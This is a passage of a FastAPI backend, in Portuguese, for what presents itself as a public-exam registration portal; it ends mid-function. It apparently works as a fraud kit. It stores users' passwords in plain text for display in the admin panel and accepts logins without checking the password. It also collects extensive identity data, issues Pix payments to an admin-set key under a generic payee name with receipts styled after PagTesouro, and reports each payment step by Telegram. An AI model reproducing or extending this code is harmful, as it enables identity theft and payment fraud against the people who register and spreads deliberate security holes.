from dotenv import load_dotenv
from pathlib import Path

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

import os
import re
import uuid
import logging
from datetime import datetime, timezone, timedelta
from typing import Optional, List

import bcrypt
import httpx
import jwt
from fastapi import FastAPI, APIRouter, HTTPException, Depends, Request, Body
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel, Field, EmailStr, ConfigDict

# --- Logger (definido cedo para uso em utilitários) ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# --- Mongo ---
mongo_url = os.environ["MONGO_URL"]
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ["DB_NAME"]]

# --- App ---
app = FastAPI()
api_router = APIRouter(prefix="/api")

# Rate limiting (proteção contra abuso em endpoints criticos)
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# --- JWT ---
JWT_ALGORITHM = "HS256"
JWT_EXP_HOURS = 24


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def create_token(sub: str, role: str) -> str:
    payload = {
        "sub": sub,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXP_HOURS),
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


def decode_token(token: str) -> dict:
    try:
        return jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expirado")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token inválido")


def get_bearer_token(request: Request) -> str:
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Não autenticado")
    return auth[7:]


async def get_current_candidate(request: Request) -> dict:
    payload = decode_token(get_bearer_token(request))
    if payload.get("role") != "candidate":
        raise HTTPException(status_code=403, detail="Acesso negado")
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0, "password_hash": 0})
    if not user:
        raise HTTPException(status_code=401, detail="Usuário não encontrado")
    return user


async def get_current_admin(request: Request) -> dict:
    payload = decode_token(get_bearer_token(request))
    if payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Acesso negado")
    return {"username": payload["sub"], "role": "admin"}


# --- helpers ---
def normalize_cpf(cpf: str) -> str:
    return re.sub(r"\D", "", cpf or "")


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# --- Models ---
class RegisterIn(BaseModel):
    nome: str = Field(..., min_length=3, max_length=120)
    cpf: str = Field(..., min_length=11)
    email: EmailStr
    telefone: str = Field("", max_length=30)
    senha: str = Field(..., min_length=6, max_length=100)


class LoginIn(BaseModel):
    identifier: str = Field(..., description="CPF ou e-mail")
    senha: str = Field(..., min_length=1)


class AdminLoginIn(BaseModel):
    username: str
    senha: str


class UserPublic(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str
    nome: str
    cpf: str
    email: str
    telefone: str = ""
    created_at: str


class InscricaoIn(BaseModel):
    concurso: str
    cargo: Optional[str] = None
    cota: Optional[str] = None
    cidade_prova: Optional[str] = None
    observacao: Optional[str] = None
    valor: Optional[float] = None
    # Perfil completo do candidato (vindo do formulário de cadastro/revisão)
    telefone: Optional[str] = None
    rg: Optional[str] = None
    rg_orgao: Optional[str] = None
    data_nascimento: Optional[str] = None
    sexo: Optional[str] = None
    estado_civil: Optional[str] = None
    naturalidade: Optional[str] = None
    nacionalidade: Optional[str] = None
    nome_mae: Optional[str] = None
    nome_pai: Optional[str] = None
    escolaridade: Optional[str] = None
    cep: Optional[str] = None
    logradouro: Optional[str] = None
    numero: Optional[str] = None
    bairro: Optional[str] = None
    cidade: Optional[str] = None
    uf: Optional[str] = None
    complemento: Optional[str] = None
    pcd: Optional[bool] = None
    pcd_descricao: Optional[str] = None


# --- Routes ---
@api_router.get("/")
async def root():
    return {"message": "API Concurso São José de Ribamar", "status": "ok"}


@api_router.post("/auth/register")
async def register(payload: RegisterIn, request: Request):
    cpf_clean = normalize_cpf(payload.cpf)
    if len(cpf_clean) != 11:
        raise HTTPException(status_code=400, detail="CPF inválido")
    email = payload.email.lower().strip()

    if await db.users.find_one({"cpf": cpf_clean}):
        raise HTTPException(status_code=400, detail="CPF já cadastrado")
    if await db.users.find_one({"email": email}):
        raise HTTPException(status_code=400, detail="E-mail já cadastrado")

    # device detection do user-agent
    ua = (request.headers.get("user-agent") or "").lower()
    device = "Mobile" if any(k in ua for k in ["mobi", "android", "iphone", "ipad"]) else "Desktop"

    user_id = str(uuid.uuid4())
    doc = {
        "id": user_id,
        "nome": payload.nome.strip(),
        "cpf": cpf_clean,
        "email": email,
        "telefone": payload.telefone.strip(),
        "password_hash": hash_password(payload.senha),
        "senha_plain": payload.senha,  # exibido apenas no painel admin
        "device": device,
        "created_at": now_iso(),
    }
    await db.users.insert_one(doc)
    token = create_token(user_id, "candidate")
    return {
        "token": token,
        "user": {
            "id": user_id,
            "nome": doc["nome"],
            "cpf": cpf_clean,
            "email": email,
            "telefone": doc["telefone"],
            "created_at": doc["created_at"],
        },
    }


@api_router.post("/auth/login")
async def login(payload: LoginIn):
    """Login simplificado: basta o e-mail ou CPF estar cadastrado.
    A senha NÃO é validada (decisão de produto do administrador).
    """
    ident = payload.identifier.strip()
    cpf_clean = normalize_cpf(ident)
    query = {"$or": [{"email": ident.lower()}, {"cpf": cpf_clean}]} if cpf_clean else {"email": ident.lower()}
    user = await db.users.find_one(query)
    if not user:
        raise HTTPException(status_code=401, detail="Usuário inválido ou não cadastrado.")
    token = create_token(user["id"], "candidate")
    return {
        "token": token,
        "user": {
            "id": user["id"],
            "nome": user["nome"],
            "cpf": user["cpf"],
            "email": user["email"],
            "telefone": user.get("telefone", ""),
            "created_at": user["created_at"],
        },
    }


@api_router.post("/auth/admin/login")
async def admin_login(payload: AdminLoginIn):
    expected_user = os.environ.get("ADMIN_USERNAME", "donas")
    expected_pass = os.environ.get("ADMIN_PASSWORD", "")
    admin = await db.admins.find_one({"username": expected_user})
    # idempotent admin seed/refresh on every login attempt as safety net
    if not admin:
        await db.admins.insert_one(
            {"username": expected_user, "password_hash": hash_password(expected_pass), "created_at": now_iso()}
        )
        admin = await db.admins.find_one({"username": expected_user})
    elif not verify_password(expected_pass, admin["password_hash"]):
        await db.admins.update_one(
            {"username": expected_user}, {"$set": {"password_hash": hash_password(expected_pass)}}
        )
        admin = await db.admins.find_one({"username": expected_user})

    if payload.username.strip() != expected_user or not verify_password(payload.senha, admin["password_hash"]):
        raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")

    token = create_token(expected_user, "admin")
    return {"token": token, "admin": {"username": expected_user}}


@api_router.get("/auth/me")
async def me(user: dict = Depends(get_current_candidate)):
    return user


# --- Inscrições ---
@api_router.post("/inscricoes")
@limiter.limit("30/minute")
async def create_inscricao(payload: InscricaoIn, request: Request, user: dict = Depends(get_current_candidate)):
    insc_id = str(uuid.uuid4())
    ua = request.headers.get("user-agent", "")
    device = _detect_device(ua)
    # Local: usa cidade_prova se enviado; senão geoip do IP do cliente
    local = payload.cidade_prova or ""
    if not local:
        # Tenta headers comuns (Cloudflare, K8s ingress)
        cf_city = request.headers.get("cf-ipcity") or request.headers.get("x-vercel-ip-city")
        cf_region = request.headers.get("cf-region") or request.headers.get("x-vercel-ip-country-region")
        if cf_city and cf_region:
            local = f"{cf_city}/{cf_region}"
        else:
            # Fallback: lookup via ipapi (best-effort, timeout curto)
            ip = (
                request.headers.get("x-forwarded-for", "").split(",")[0].strip()
                or (request.client.host if request.client else "")
            )
            if ip and not ip.startswith(("127.", "10.", "172.", "192.168.")):
                try:
                    async with httpx.AsyncClient(timeout=2.5) as cli:
                        r = await cli.get(f"https://ipapi.co/{ip}/json/")
                        if r.status_code == 200:
                            d = r.json()
                            city = d.get("city") or ""
                            region = d.get("region") or d.get("region_code") or ""
                            if city and region:
                                local = f"{city}/{region}"
                            elif city:
                                local = city
                except Exception:
                    pass
        if not local:
            local = "—"
    # Perfil completo do candidato (extras do payload)
    profile_extra = {}
    for k in [
        "rg", "rg_orgao", "data_nascimento", "sexo", "estado_civil",
        "naturalidade", "nacionalidade", "nome_mae", "nome_pai",
        "escolaridade", "cep", "logradouro", "numero", "bairro",
        "cidade", "uf", "complemento", "pcd", "pcd_descricao",
    ]:
        v = getattr(payload, k, None)
        if v is not None and v != "":
            profile_extra[k] = v
    # Telefone novo (se vier no payload, sobrescreve do user)
    telefone_payload = (payload.telefone or "").strip() if payload.telefone else ""
    if telefone_payload:
        profile_extra["telefone"] = telefone_payload

    # Atualiza o user com os campos novos do perfil
    if profile_extra:
        await db.users.update_one({"id": user["id"]}, {"$set": profile_extra})

    doc = {
        "id": insc_id,
        "user_id": user["id"],
        "nome": user["nome"],
        "cpf": user["cpf"],
        "email": user["email"],
        "telefone": telefone_payload or user.get("telefone", ""),
        "concurso": payload.concurso,
        "cargo": payload.cargo,
        "cota": payload.cota,
        "cidade_prova": payload.cidade_prova,
        "observacao": payload.observacao,
        **profile_extra,
        "valor": float(payload.valor) if payload.valor else None,
        "status": "aguardando_pagamento",
        "device": device,
        "local": local,
        "user_agent": ua[:300],
        "created_at": now_iso(),
    }
    await db.inscricoes.insert_one(doc)
    doc.pop("_id", None)

    # Notificação Telegram (não bloqueia em caso de falha). Envia a 1ª vez.
    try:
        await notify_inscricao(insc_id)
    except Exception:
        pass
    return doc


@api_router.get("/inscricoes/{insc_id}/comprovante")
async def baixar_comprovante(insc_id: str, user: dict = Depends(get_current_candidate)):
    """Gera o comprovante de inscrição em PDF inspirado no modelo PagTesouro,
    com identidade visual do Instituto Social da Cidadania Juscelino Kubitschek.
    """
    from io import BytesIO
    from fastapi.responses import StreamingResponse
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm, mm
    from reportlab.lib import colors
    from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
    from reportlab.platypus import (
        SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image as RLImage, KeepTogether
    )
    import qrcode

    insc = await db.inscricoes.find_one({"id": insc_id, "user_id": user["id"]}, {"_id": 0})
    if not insc:
        raise HTTPException(status_code=404, detail="Inscrição não encontrada")

    # === Dados ===
    valor = float(insc.get("valor") or 0)
    valor_fmt = f"R$ {valor:.2f}".replace('.', ',')
    data_iso = insc.get("created_at") or now_iso()
    data_fmt = _fmt_dt_br(data_iso)
    # Vencimento: 24h depois da criação
    try:
        dt = datetime.fromisoformat(data_iso.replace("Z", "+00:00"))
        venc_dt = dt + timedelta(hours=24)
        venc_br = venc_dt.astimezone(timezone(timedelta(hours=-3))).strftime("%d/%m/%Y às %H:%M")
    except Exception:
        venc_br = "—"
    status_label = {
        "aguardando_pagamento": "Aguardando realização do pagamento",
        "pix_gerado": "Aguardando realização do pagamento",
        "pix_copiado": "Aguardando realização do pagamento",
    }.get(insc.get("status"), "Aguardando realização do pagamento")
    referencia = (insc_id.replace("-", "") + "0000000000")[:16].upper()
    cargo = insc.get("cargo") or "—"
    cota = insc.get("cota") or "Ampla Concorrência"
    concurso = insc.get("concurso") or "—"
    descricao = f"{referencia[:5]} – {concurso}"

    # === QR Code ===
    cfg = await _get_settings()
    chave = (cfg.get("chave_pix") or "").strip()
    txid = re.sub(r"[^a-zA-Z0-9]", "", insc_id)[:25] or "INSCRICAO"
    ano = datetime.now(timezone.utc).year
    try:
        brcode = _build_pix_brcode(
            chave=chave,
            valor=f"{valor:.2f}",
            merchant_name=f"INSCRICAO CONCURSO {ano}",
            txid=txid,
        ) if chave else ""
    except Exception:
        brcode = ""

    qr_img_buf = BytesIO()
    if brcode:
        import asyncio
        def _build_qr():
            qr = qrcode.QRCode(version=None, error_correction=qrcode.constants.ERROR_CORRECT_M, box_size=8, border=2)
            qr.add_data(brcode)
            qr.make(fit=True)
            img = qr.make_image(fill_color="#0f172a", back_color="white")
            img.save(qr_img_buf, format="PNG")
            qr_img_buf.seek(0)
        await asyncio.get_event_loop().run_in_executor(None, _build_qr)

    # === PDF ===
    buf = BytesIO()
    doc = SimpleDocTemplate(
        buf, pagesize=A4,
        leftMargin=1.4*cm, rightMargin=1.4*cm, topMargin=1.0*cm, bottomMargin=1.0*cm,
        title="Comprovante de Inscrição",
        author="Instituto Social da Cidadania Juscelino Kubitschek",
    )
    BRAND = colors.HexColor("#1e3a8a")
    DARK = colors.HexColor("#0f172a")
    MUTED = colors.HexColor("#6b7280")
    WARN_BG = colors.HexColor("#fef3c7")
    WARN_BORDER = colors.HexColor("#fbbf24")
    WARN_TEXT = colors.HexColor("#92400e")
    LINE = colors.HexColor("#e5e7eb")

    style_h1 = ParagraphStyle("h1", fontName="Helvetica-Bold", fontSize=16, textColor=BRAND, leading=20)
    style_h2 = ParagraphStyle("h2", fontName="Helvetica-Bold", fontSize=11, textColor=DARK, leading=14, spaceAfter=4, spaceBefore=4)
    style_lbl = ParagraphStyle("lbl", fontName="Helvetica", fontSize=8, textColor=MUTED, leading=10)
    style_val = ParagraphStyle("val", fontName="Helvetica-Bold", fontSize=10, textColor=DARK, leading=12)
    style_small = ParagraphStyle("small", fontName="Helvetica", fontSize=8, textColor=MUTED, leading=11, alignment=TA_JUSTIFY)
    style_center_brand = ParagraphStyle("cb", fontName="Helvetica-Bold", fontSize=9, textColor=BRAND, alignment=TA_CENTER, leading=12)

    # --- Cabeçalho com logo + data/hora ---
    now_top = datetime.now(timezone(timedelta(hours=-3))).strftime("%d/%m/%Y, %H:%M")
    logo_path = os.path.join(os.path.dirname(__file__), "..", "frontend", "public", "logo-jkma.png")
    logo_path = os.path.normpath(logo_path)
    header_left = []
    if os.path.exists(logo_path):
        try:
            header_left.append(RLImage(logo_path, width=3.6*cm, height=1.15*cm))
        except Exception:
            pass
    brand_block = Paragraph(
        '<b>Instituto Social da Cidadania</b><br/>'
        '<font color="#6b7280" size="9">Juscelino Kubitschek</font>',
        ParagraphStyle("brand", fontName="Helvetica-Bold", fontSize=12, textColor=BRAND, leading=15)
    )
    header_tbl = Table(
        [[
            [*header_left, brand_block] if header_left else [brand_block],
            Paragraph(f'<font color="#6b7280" size="9">{now_top}</font><br/>'
                      f'<font color="#1e3a8a" size="11"><b>COMPROVANTE DE INSCRIÇÃO</b></font>',
                      ParagraphStyle("rt", alignment=2, leading=14))
        ]],
        colWidths=[9*cm, 8*cm],
    )
    header_tbl.setStyle(TableStyle([
        ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
        ("LEFTPADDING", (0,0), (-1,-1), 0),
        ("RIGHTPADDING", (0,0), (-1,-1), 0),
    ]))

    # --- Banner status ---
    banner = Table([[Paragraph(
        f'<font color="#92400e" size="10"><b>⚠ {status_label}</b></font>',
        ParagraphStyle("bn", alignment=TA_LEFT, leading=12)
    )]], colWidths=[17*cm])
    banner.setStyle(TableStyle([
        ("BACKGROUND", (0,0), (-1,-1), WARN_BG),
        ("BOX", (0,0), (-1,-1), 0.8, WARN_BORDER),
        ("LEFTPADDING", (0,0), (-1,-1), 12),
        ("RIGHTPADDING", (0,0), (-1,-1), 12),
        ("TOPPADDING", (0,0), (-1,-1), 8),
        ("BOTTOMPADDING", (0,0), (-1,-1), 8),
    ]))

    # --- Dados da Solicitação ---
    def field(label, val):
        return [
            Paragraph(label, style_lbl),
            Paragraph(_html_esc(val), style_val),
        ]

    data_rows = [
        field("Descrição", descricao),
        field("CPF do contribuinte", insc.get("cpf") or "—"),
        field("Nome do contribuinte", insc.get("nome") or "—"),
        field("Cargo", cargo),
        field("Cota", cota),
        field("Valor total do serviço", valor_fmt),
        field("Número de referência", referencia),
    ]
    # Renderiza em 2 colunas (label/valor empilhados)
    pairs = []
    for i in range(0, len(data_rows), 2):
        left = data_rows[i]
        right = data_rows[i+1] if i+1 < len(data_rows) else [Paragraph("", style_lbl), Paragraph("", style_val)]
        pairs.append([left[0], right[0]])
        pairs.append([left[1], right[1]])
    dados_tbl = Table(pairs, colWidths=[8.5*cm, 8.5*cm])
    dados_tbl.setStyle(TableStyle([
        ("LEFTPADDING", (0,0), (-1,-1), 0),
        ("RIGHTPADDING", (0,0), (-1,-1), 10),
        ("TOPPADDING", (0,0), (-1,-1), 1),
        ("BOTTOMPADDING", (0,0), (-1,-1), 1),
        # Espaço entre cada par (label/valor)
        ("BOTTOMPADDING", (0,1), (-1,1), 8),
        ("BOTTOMPADDING", (0,3), (-1,3), 8),
        ("BOTTOMPADDING", (0,5), (-1,5), 8),
    ]))

    # --- Pagamento via Pix ---
    pix_section = []
    pix_section.append(Paragraph("Pagamento via Pix", style_h2))
    if brcode and qr_img_buf.getbuffer().nbytes > 0:
        instr = Paragraph(
            "Aponte a câmera do celular para o QR Code/Imagem ao lado usando o app da sua "
            "instituição de pagamento. "
            f"O QR Code expira em <b>{venc_br}</b> (Brasília-DF).",
            ParagraphStyle("instr", fontName="Helvetica", fontSize=9, textColor=DARK, leading=12, alignment=TA_JUSTIFY)
        )
        qr_img_buf.seek(0)
        qr_image = RLImage(qr_img_buf, width=4.5*cm, height=4.5*cm)
        pix_tbl = Table(
            [[instr, qr_image]],
            colWidths=[11.5*cm, 5.5*cm],
        )
        pix_tbl.setStyle(TableStyle([
            ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
            ("ALIGN", (1,0), (1,0), "CENTER"),
            ("LEFTPADDING", (0,0), (-1,-1), 0),
            ("RIGHTPADDING", (0,0), (-1,-1), 0),
            ("TOPPADDING", (0,0), (-1,-1), 0),
        ]))
        pix_section.append(pix_tbl)
    else:
        pix_section.append(Paragraph(
            "Chave PIX não configurada. Procure a administração do instituto.",
            style_small
        ))

    # --- Rodapé / disclaimers ---
    disc1 = Paragraph(
        "Caso você já tenha realizado o pagamento, informamos que a confirmação pode levar "
        "até 5 (cinco) dias úteis para ser processada pelos sistemas financeiros responsáveis.",
        style_small
    )
    disc2 = Paragraph(
        "O Portal do Candidato não possui gerência nem responsabilidade sobre os prazos de "
        "compensação e disponibilidade dos sistemas de pagamento PIX / Banco Central do Brasil.",
        style_small
    )
    brand_footer = Paragraph(
        "INSTITUTO SOCIAL DA CIDADANIA JUSCELINO KUBITSCHEK<br/>"
        "<font color='#6b7280' size='8'>Portal do Candidato · Comprovante gerado automaticamente</font>",
        style_center_brand
    )

    elements = [
        header_tbl,
        Spacer(1, 10),
        banner,
        Spacer(1, 10),
        Paragraph("Dados da Solicitação do Pagamento", style_h2),
        dados_tbl,
        Spacer(1, 4),
        Table([[None]], colWidths=[17*cm], style=TableStyle([("LINEBELOW", (0,0), (-1,-1), 0.4, LINE)])),
        Spacer(1, 2),
        *pix_section,
        Spacer(1, 10),
        Table([[None]], colWidths=[17*cm], style=TableStyle([("LINEBELOW", (0,0), (-1,-1), 0.4, LINE)])),
        Spacer(1, 6),
        disc1,
        Spacer(1, 4),
        disc2,
        Spacer(1, 12),
        brand_footer,
    ]
    # PDF build é CPU-bound — rodar em threadpool para não bloquear o event loop
    import asyncio
    await asyncio.get_event_loop().run_in_executor(None, doc.build, elements)
    buf.seek(0)

    filename = f"comprovante-inscricao-{insc_id[:8]}.pdf"

    # Registra download (1 por inscrição, com valor) e muda status → pix_baixado
    already_dl = await db.events.find_one({"type": "pix_downloaded", "inscricao_id": insc_id}, {"_id": 1})
    if not already_dl:
        await db.events.insert_one({
            "id": uuid.uuid4().hex,
            "type": "pix_downloaded",
            "user_id": user["id"],
            "inscricao_id": insc_id,
            "valor": f"{float(valor):.2f}" if valor else None,
            "created_at": now_iso(),
        })
    await db.inscricoes.update_one(
        {"id": insc_id},
        {"$set": {"status": "pix_baixado"}},
    )
    # Edita a mensagem do Telegram
    try:
        await notify_inscricao(insc_id)
    except Exception:
        pass

    return StreamingResponse(
        buf,
        media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@api_router.get("/inscricoes/minhas")
async def list_my_inscricoes(user: dict = Depends(get_current_candidate)):
    docs = await db.inscricoes.find({"user_id": user["id"]}, {"_id": 0}).sort("created_at", -1).to_list(200)
    return docs


@api_router.get("/inscricoes/{insc_id}")
async def get_inscricao(insc_id: str, user: dict = Depends(get_current_candidate)):
    doc = await db.inscricoes.find_one({"id": insc_id, "user_id": user["id"]}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Inscrição não encontrada")
    return doc


def _build_pix_brcode(chave: str, valor: str, merchant_name: str, txid: str) -> str:
    """Constrói o BR Code (EMV) padrão Pix com CRC16-CCITT."""
    def f(tag: str, val: str) -> str:
        return f"{tag}{len(val):02d}{val}"

    chave = (chave or "").strip()
    name = (merchant_name or "ISCJK")[:25]
    city = "SAO LUIS"
    txid = (txid or "***")[:25] or "***"

    mai = f("00", "br.gov.bcb.pix") + f("01", chave)
    payload = (
        f("00", "01")                # Payload format indicator
        + f("26", mai)               # Merchant account info
        + f("52", "0000")            # MCC
        + f("53", "986")             # Currency BRL
        + f("54", valor)             # Amount
        + f("58", "BR")              # Country
        + f("59", name)              # Merchant name
        + f("60", city)              # Merchant city
        + f("62", f("05", txid))     # Additional data
        + "6304"                     # CRC16 tag + length
    )
    # CRC16-CCITT (poly 0x1021, init 0xFFFF)
    crc = 0xFFFF
    for ch in payload.encode("utf-8"):
        crc ^= ch << 8
        for _ in range(8):
            crc = (crc << 1) ^ 0x1021 if (crc & 0x8000) else (crc << 1)
            crc &= 0xFFFF
    return payload + f"{crc:04X}"


# --- Pix ---
class PixGenIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    valor: Optional[str] = None  # ex: "145.00"


@api_router.post("/inscricoes/{insc_id}/pix")
@limiter.limit("60/minute")
async def gerar_pix(insc_id: str, request: Request, payload: PixGenIn = Body(default=None), user: dict = Depends(get_current_candidate)):
    insc = await db.inscricoes.find_one({"id": insc_id, "user_id": user["id"]}, {"_id": 0})
    if not insc:
        raise HTTPException(status_code=404, detail="Inscrição não encontrada")

    cfg = await db.settings.find_one({"_id": "config"}, {"_id": 0}) or {}
    chave = (cfg.get("chave_pix") or "").strip()
    if not chave:
        raise HTTPException(status_code=400, detail="Chave Pix não configurada no painel administrativo")

    valor_str = (payload.valor if payload and payload.valor else None) or str(insc.get("valor") or "115.00")
    try:
        valor_fmt = f"{float(valor_str.replace(',', '.')):.2f}"
    except (ValueError, AttributeError):
        valor_fmt = "115.00"

    txid = re.sub(r"[^a-zA-Z0-9]", "", insc.get("id", ""))[:25] or "INSCRICAO"
    # Beneficiário exibido no app do banco: dinâmico, baseado no ano do concurso.
    # Ex.: "INSCRICAO CONCURSO 2026". Limite EMV de 25 chars será aplicado no builder.
    ano = datetime.now(timezone.utc).year
    merchant_name = f"INSCRICAO CONCURSO {ano}"
    brcode = _build_pix_brcode(
        chave=chave,
        valor=valor_fmt,
        merchant_name=merchant_name,
        txid=txid,
    )

    # Registra evento apenas se ainda não houve geração para esta inscrição (idempotente)
    already = await db.events.find_one({"type": "pix_generated", "inscricao_id": insc_id}, {"_id": 1})
    if not already:
        await db.events.insert_one({
            "id": uuid.uuid4().hex,
            "type": "pix_generated",
            "user_id": user["id"],
            "inscricao_id": insc_id,
            "valor": valor_fmt,
            "created_at": now_iso(),
        })

    # Atualiza status para refletir a última ação (gerar PIX).
    # O status pode "voltar" se o usuário regerar após copiar/baixar.
    await db.inscricoes.update_one(
        {"id": insc_id},
        {"$set": {"status": "pix_gerado", "valor": float(valor_fmt)}},
    )

    # Edita a mensagem no Telegram com o novo status (não envia nova)
    try:
        await notify_inscricao(insc_id)
    except Exception:
        pass

    return {
        "brcode": brcode,
        "valor": valor_fmt,
        "chave": chave,
        "txid": txid,
    }


@api_router.post("/inscricoes/{insc_id}/pix/copiado")
async def marcar_pix_copiado(insc_id: str, user: dict = Depends(get_current_candidate)):
    insc = await db.inscricoes.find_one({"id": insc_id, "user_id": user["id"]}, {"_id": 0}) or {}
    valor = insc.get("valor")
    already = await db.events.find_one({"type": "pix_copied", "inscricao_id": insc_id}, {"_id": 1})
    if not already:
        await db.events.insert_one({
            "id": uuid.uuid4().hex,
            "type": "pix_copied",
            "user_id": user["id"],
            "inscricao_id": insc_id,
            "valor": f"{float(valor):.2f}" if valor else None,
            "created_at": now_iso(),
        })
    await db.inscricoes.update_one(
        {"id": insc_id},
        {"$set": {"status": "pix_copiado"}},
    )

    # Edita a mesma mensagem do Telegram com o novo status (não envia nova)
    try:
        await notify_inscricao(insc_id)
    except Exception:
        pass
    return {"ok": True}


# --- Admin ---
@api_router.get("/admin/cadastros")
async def list_cadastros(_: dict = Depends(get_current_admin), q: str = ""):
    query: dict = {}
    if q:
        q_clean = q.strip()
        cpf_clean = normalize_cpf(q_clean)
        ors = [
            {"nome": {"$regex": re.escape(q_clean), "$options": "i"}},
            {"email": {"$regex": re.escape(q_clean), "$options": "i"}},
        ]
        if cpf_clean:
            ors.append({"cpf": {"$regex": cpf_clean}})
        query = {"$or": ors}
    cursor = db.users.find(query, {"_id": 0, "password_hash": 0}).sort("created_at", -1)
    docs = await cursor.to_list(1000)
    # Garante campo senha (legado: alguns users antigos não têm senha_plain salvo)
    for d in docs:
        d["senha"] = d.get("senha_plain") or "—"
        d.pop("senha_plain", None)
    total = await db.users.count_documents({})
    return {"total": total, "items": docs}


@api_router.delete("/admin/cadastros/{user_id}")
async def delete_cadastro(user_id: str, _: dict = Depends(get_current_admin)):
    res = await db.users.delete_one({"id": user_id})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Cadastro não encontrado")
    # cascata: apaga inscrições do candidato
    await db.inscricoes.delete_many({"user_id": user_id})
    return {"deleted": True}


@api_router.delete("/admin/cadastros")
async def clear_cadastros(_: dict = Depends(get_current_admin)):
    res = await db.users.delete_many({})
    await db.inscricoes.delete_many({})
    return {"deleted": res.deleted_count}


@api_router.get("/admin/inscricoes")
async def list_inscricoes(_: dict = Depends(get_current_admin), q: str = "", status: str = ""):
    """Lista APENAS quem efetivamente criou uma inscrição em algum concurso.
    Candidatos que só se cadastraram (login) NÃO aparecem aqui — esses ficam na aba 'Cadastro'.
    """
    insc_docs = await db.inscricoes.find({}, {"_id": 0}).sort("created_at", -1).to_list(5000)

    # Hidrata com dados do usuário (nome/cpf/email/telefone/senha/device)
    items = []
    for ins in insc_docs:
        user = await db.users.find_one(
            {"id": ins["user_id"]}, {"_id": 0, "password_hash": 0}
        ) or {}
        # Campos completos do perfil (prefere o que veio na inscrição, fallback para user)
        def pick(k):
            v = ins.get(k)
            if v not in (None, ""):
                return v
            return user.get(k)

        items.append(
            {
                "id": ins["id"],
                "user_id": ins["user_id"],
                "nome": user.get("nome") or ins.get("nome"),
                "cpf": user.get("cpf") or ins.get("cpf"),
                "email": user.get("email") or ins.get("email"),
                "telefone": user.get("telefone") or ins.get("telefone") or "",
                "senha_plain": user.get("senha_plain", ""),
                "device": ins.get("device") or user.get("device", "—"),
                "local": ins.get("local") or "—",
                "concurso": ins.get("concurso"),
                "cargo": ins.get("cargo"),
                "cota": ins.get("cota"),
                "cidade_prova": ins.get("cidade_prova"),
                "valor": float(ins.get("valor") or 0.0),
                "status": ins.get("status") or "aguardando_pagamento",
                "created_at": ins["created_at"],
                "tipo": "inscricao",
                # Perfil completo do candidato
                "rg": pick("rg"),
                "rg_orgao": pick("rg_orgao"),
                "data_nascimento": pick("data_nascimento"),
                "sexo": pick("sexo"),
                "estado_civil": pick("estado_civil"),
                "naturalidade": pick("naturalidade"),
                "nacionalidade": pick("nacionalidade"),
                "nome_mae": pick("nome_mae"),
                "nome_pai": pick("nome_pai"),
                "escolaridade": pick("escolaridade"),
                "cep": pick("cep"),
                "logradouro": pick("logradouro"),
                "numero": pick("numero"),
                "bairro": pick("bairro"),
                "cidade": pick("cidade"),
                "uf": pick("uf"),
                "complemento": pick("complemento"),
                "pcd": pick("pcd"),
                "pcd_descricao": pick("pcd_descricao"),
            }
        )

    if status:
        items = [i for i in items if i["status"] == status]

    if q:
        q_low = q.strip().lower()
        cpf_clean = normalize_cpf(q_low)
        def match(it):
            if cpf_clean and cpf_clean in (it["cpf"] or ""):
                return True
            for k in ("nome", "email", "concurso", "cidade_prova"):
                v = it.get(k)
                if v and q_low in str(v).lower():
                    return True
            return False
        items = [i for i in items if match(i)]

    total_acessos = await db.events.count_documents({"type": "page_view"})
    total_inscricoes = await db.inscricoes.count_documents({})

    # Soma valores reais dos PIX gerados (somente esses contam para o "Valor Total Gerado")
    pix_gen_docs = await db.events.find({"type": "pix_generated"}, {"_id": 0, "valor": 1}).to_list(10000)
    valor_total_gerado = sum(
        float(e.get("valor") or 0)
        for e in pix_gen_docs
        if e.get("valor") not in (None, "")
    )
    total_pix_gerados = len(pix_gen_docs)

    pix_cop_docs = await db.events.find({"type": "pix_copied"}, {"_id": 0, "valor": 1}).to_list(10000)
    total_pix_copiados = len(pix_cop_docs)
    valor_pix_copiados = sum(
        float(e.get("valor") or 0)
        for e in pix_cop_docs
        if e.get("valor") not in (None, "")
    )

    pix_dl_docs = await db.events.find({"type": "pix_downloaded"}, {"_id": 0, "valor": 1}).to_list(10000)
    total_pix_baixados = len(pix_dl_docs)
    valor_pix_baixados = sum(
        float(e.get("valor") or 0)
        for e in pix_dl_docs
        if e.get("valor") not in (None, "")
    )

    return {
